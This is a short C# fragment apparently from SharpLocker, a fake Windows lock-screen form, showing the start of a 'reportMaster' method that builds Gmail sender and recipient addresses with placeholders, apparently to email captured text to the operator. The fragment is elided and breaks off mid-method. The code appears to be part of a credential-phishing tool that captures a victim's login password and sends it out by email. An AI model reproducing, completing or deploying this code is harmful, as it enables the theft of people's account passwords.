...
namespace SharpLocker
{
    public partial class LockScreenForm : Form
    {
        ...
        private void reportMaster(string text)
        {
            var fromAddress = new MailAddress("*your-gmail", "automatic report");
            var toAddress = new MailAddress("*destination-to-get-gmail", "*report-name");
